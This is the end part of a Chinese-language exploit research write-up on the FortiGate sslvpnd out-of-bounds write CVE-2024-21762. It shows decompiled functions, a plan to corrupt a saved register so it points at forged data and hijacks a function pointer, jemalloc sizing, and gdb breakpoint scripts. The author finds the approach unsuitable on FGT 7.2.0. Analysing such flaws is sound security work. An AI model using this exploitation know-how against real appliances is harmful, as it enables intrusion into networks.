        if ( *(_QWORD *)(a1 + k + 616) )
        {
          *(_DWORD *)(v20 + 4 * k + 16) = *(_DWORD *)(v20 + 4 * k + 24);
          *(_DWORD *)(v20 + 4 * k + 20) = *(_DWORD *)(v20 + 4 * k + 28);
        }
      }
      v22 = **(__int64 ***)(v5 + 112);
      *(_QWORD *)(v5 + 112) = v22;
LABEL_46:
      v23 = *v22;
      if ( *v22 == v8 )
        goto LABEL_19;
      for ( l = 0LL; l != 40; l += 8LL )
      {
        if ( *(_QWORD *)(a1 + l + 616) )
        {
          *(_DWORD *)(v23 + 4 * l + 16) = *(_DWORD *)(v23 + 4 * l + 24);
          *(_DWORD *)(v23 + 4 * l + 20) = *(_DWORD *)(v23 + 4 * l + 28);
        }
      }
      *(_QWORD *)(v5 + 112) = **(_QWORD **)(v5 + 112);
      result = 0LL;
      break;
    case 5u:
      v25 = *(_QWORD *)(v5 + 112);
      if ( v25 && v8 == v25 )
        v25 = 0LL;
      for ( m = 0LL; m != 40; m += 8LL )
      {
        if ( *(_QWORD *)(a1 + m + 616) )
        {
          *(_DWORD *)(v25 + 4 * m + 16) = *(_DWORD *)(v25 + 4 * m + 24);
          *(_DWORD *)(v25 + 4 * m + 20) = *(_DWORD *)(v25 + 4 * m + 28);
        }
      }
      return 0LL;
    case 6u:
      goto LABEL_19;
    default:
      return 0xFFFFFFFFLL;
  }
  return result;
}
```

sub_1715180 在调用sub_1713A40时，此时a1地址保存在r13寄存器中，在进入sub_1713A40后，会对r13进行push，返回时会pop r13，返回到sub_1715180后，会继续使用r13引用a1。



利用思路：

通过修改sub_1713A40栈中的a1的值，使其返回到sub_1715180指向恶意的数据

```c
__int64 __fastcall sub_1715180(__int64 a1, char a2)
{
................
      do
    {
      v5 = a1 + 32 * (v4 + 6LL);
      if ( (*(_BYTE *)(v5 + 16) & 2) != 0 )
      {
        result = sub_1713A40(a1, v4, 1u);//进行chunk读操作,返回后a1 也就是 r13 指向了我们构造的恶意数据（pop r13）
        if ( (_DWORD)result )//返回值为0
          goto LABEL_23;
        *(_BYTE *)(v5 + 16) &= 0xFDu;
      }
      v6 = a1 + 32 * (v4 + 6LL); // 
      if ( (*(_BYTE *)(v6 + 16) & 4) != 0 )//使其满足条件
      {
        result = sub_1713A40(a1, v4, 0);//当前a1为恶意数据
        if ( (_DWORD)result )
        {
LABEL_23:
          v10 = *(_QWORD *)(a1 + 0x298);
          if ( v10 )
          {
            v9 = *(__int64 (__fastcall **)(__int64))(v10 + 0x88);
            if ( v9 )
              return v9(a1);
          }
          return sub_1713E80(a1);
        }
        *(_BYTE *)(v6 + 16) &= 0xFBu;
      }
      ++v4;
    }
    while ( v4 != 5 );
................
}
```

```c
__int64 __fastcall sub_1713A40(__int64 a1, int a2, unsigned int a3)
{
  char v4; // al
  __int64 v5; // r13
  __int64 v6; // rsi
  __int64 v7; // rcx
  __int64 v8; // r14
  unsigned int v9; // ebx
  __int64 v10; // rdx
  __int64 (__fastcall *v11)(__int64); // rax
  char v12; // al
  __int64 result; // rax
  __int64 (__fastcall *v14)(__int64, __int64, __int64, __int64); // rax
  __int64 v15; // rcx
  __int64 j; // rax
  __int64 *v17; // rax
  __int64 v18; // rcx
  __int64 i; // rax
  __int64 v20; // rcx
  __int64 k; // rax
  __int64 *v22; // rax
  __int64 v23; // rcx
  __int64 l; // rax
  __int64 v25; // rcx
  __int64 m; // rax
  __int64 v27; // [rsp+8h] [rbp-38h]

  v4 = *(_BYTE *)(a1 + 1143);
  v5 = *(_QWORD *)(a1 + 664);
  v6 = v4 & 0x20;
  if ( !v5 || (v7 = *(_QWORD *)(v5 + 0x70)) == 0 || (v8 = v5 + 96, v5 + 96 == v7) )//跳过该判断
  {
    if ( !(_BYTE)v6 )
    {
      if ( (v4 & 0x40) == 0 )
      {
LABEL_19:
        if ( (int)sub_17136C0(a1, v5) < 0 )
        {
          if ( !sub_17050F0(a1) )
          {
            sub_17050D0(a1);
            return 1LL;
          }
        }
        else if ( !sub_17050F0(a1) )
        {
          return sub_1713720(a1);
        }
        return 1LL;
      }
      return sub_1713720(a1);
    }
    goto LABEL_66;
  }
  v9 = a3;
  if ( a2 < 0 )
  {
    if ( !(_BYTE)v6 )
    {
      v12 = v4 & 0x40;
      goto LABEL_15;
    }
LABEL_66:
    *(_BYTE *)(a1 + 1140) |= 0x80u;
    return 0xFFFFFFFFLL;
  }
  if ( (_BYTE)v6 )//需要跳过
    goto LABEL_66;
  v27 = *(_QWORD *)(v5 + 0x70);
  sub_2902A70(a3);
  if ( v9 )
  {
    v11 = *(__int64 (__fastcall **)(__int64))(32LL * a2 + v27 + 32);//读
    if ( !v11 )
      return 0xFFFFFFFFLL;
    v9 = v11(a1);
    v12 = *(_BYTE *)(a1 + 1143) & 0x40;
    if ( !v9 )
    {
      if ( v12 )
        goto LABEL_10;
      *(_DWORD *)(v27 + 32LL * a2 + 16) = sub_1713990(a1, a2, 1);
      if ( (*(_BYTE *)(a1 + 1143) & 0x40) != 0 )
        return sub_1713720(a1);
      return 0LL;
    }
  }
  else//当为恶意数据时，此时应该到这里
  {
    v14 = *(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(32LL * a2 + v27 + 40);//写
    if ( !v14 )
      return 0xFFFFFFFFLL;
    v9 = v14(a1, v6, v10, v27);
    v12 = *(_BYTE *)(a1 + 1143) & 0x40;
    if ( v12 )
    {
LABEL_10:
      if ( v9 == 7 )
        return 0xFFFFFFFFLL;
      return sub_1713720(a1);
    }
    if ( !v9 )
    {
      *(_DWORD *)(v27 + 32LL * a2 + 20) = sub_1713990(a1, a2, 0);
      if ( (*(_BYTE *)(a1 + 1143) & 0x40) != 0 )
        return sub_1713720(a1);
      return 0LL;
    }
  }
..........................................
  return result;
}
```

分析发现a1为 sconn 结构体，该结构体的分配大小为：

```c
v7 = je_calloc(1LL, a5 + 0x480LL);//a5 == 0
```

也就是1152，根据jemalloc 的分配原则，该分配实际为1280字节

```
b je_malloc if (($rdi > 1024) && ($rdi <= 1280))
commands
    printf "alloc 1280 size"
    c
end

b je_calloc if (($rsi > 1024) && ($rsi <= 1280))
commands
    printf "alloc 1280 size"
    c
end
```

通过监控发现在实际请求处理过程中，存在大量该内存大小的申请，所以在FGT 7.2.0上，并不适合使用该利用方法

# 资料

Two Bytes is Plenty: FortiGate RCE with CVE-2024-21762

https://www.assetnote.io/resources/research/two-bytes-is-plenty-fortigate-rce-with-cve-2024-21762

Out-of-bound Write in sslvpnd

https://www.fortiguard.com/psirt/FG-IR-24-015